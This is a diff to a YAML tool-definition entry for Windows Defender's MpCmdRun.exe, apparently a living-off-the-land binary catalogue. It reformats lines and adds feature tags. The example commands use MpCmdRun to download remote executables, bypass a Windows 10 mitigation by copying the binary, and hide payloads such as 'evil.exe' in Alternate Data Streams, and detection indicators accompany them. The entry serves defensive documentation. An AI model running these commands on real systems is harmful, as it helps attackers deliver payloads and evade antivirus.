@@ -2,7 +2,10 @@
 id: windows-download-mpcmdrun
 namespace: windows:download:mpcmdrun
 name: mpcmdrun
-description: 'Binary part of Windows Defender. Used to manage settings in Windows Defender Located at: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe; C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.7-0\MpCmdRun.exe; C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe.'
+description: 'Binary part of Windows Defender. Used to manage settings in Windows
+  Defender Located at: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe;
+  C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.7-0\MpCmdRun.exe; C:\ProgramData\Microsoft\Windows
+  Defender\Platform\4.18.2008.9-0\MpCmdRun.exe.'
 author: Oddvar Moe
 version: 1.0.0
 capabilities:
@@ -43,7 +46,14 @@ resource_profile:
 allowed-tools:
 - mpcmdrun
 parameters: []
-features: []
+features:
+- file-system
+- local
+- network-intensive
+- pipes-stdin
+- pipes-stdout
+- process-manip
+- streaming
 execution:
   template: mpcmdrun
   sandbox: execFile
@@ -51,11 +61,17 @@ execution:
   shell: false
 global_vars: {}
 examples:
-- description: Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path) (Download file)
+- description: Download file to specified path - Slashes work as well as dashes (/DownloadFile,
+    /url, /path) (Download file)
   command: MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}
-- description: Download file to specified path. Slashes work as well as dashes (/DownloadFile, /url, /path). Updated version to bypass Windows 10 mitigation. (Download file)
-  command: copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url {REMOTEURL:.exe} -path C:\Users\Public\Downloads\evil.exe
-- description: Download file to machine and store it in Alternate Data Stream (Hide downloaded data into an Alternate Data Stream)
+- description: Download file to specified path. Slashes work as well as dashes (/DownloadFile,
+    /url, /path). Updated version to bypass Windows 10 mitigation. (Download file)
+  command: copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe"
+    C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\"
+    && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url {REMOTEURL:.exe} -path
+    C:\Users\Public\Downloads\evil.exe
+- description: Download file to machine and store it in Alternate Data Stream (Hide
+    downloaded data into an Alternate Data Stream)
   command: MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe
 references:
 - label: command-line-arguments-microsoft-defender-antiviru
@@ -80,9 +96,11 @@ detections:
 - type: ioc
   description: MpCmdRun storing data into alternate data streams.
 - type: ioc
-  description: MpCmdRun retrieving a file from a remote machine or the internet that is not expected.
+  description: MpCmdRun retrieving a file from a remote machine or the internet that
+    is not expected.
 - type: ioc
-  description: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching mpcmdrun.exe.
+  description: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts
+    launching mpcmdrun.exe.
 - type: ioc
   description: Monitor for the creation of %USERPROFILE%\AppData\Local\Temp\MpCmdRun.log
 - type: ioc
@@ -93,7 +111,6 @@ install:
   commands:
   - choco install mpcmdrun
 ---
-
 
 # mpcmdrun
 
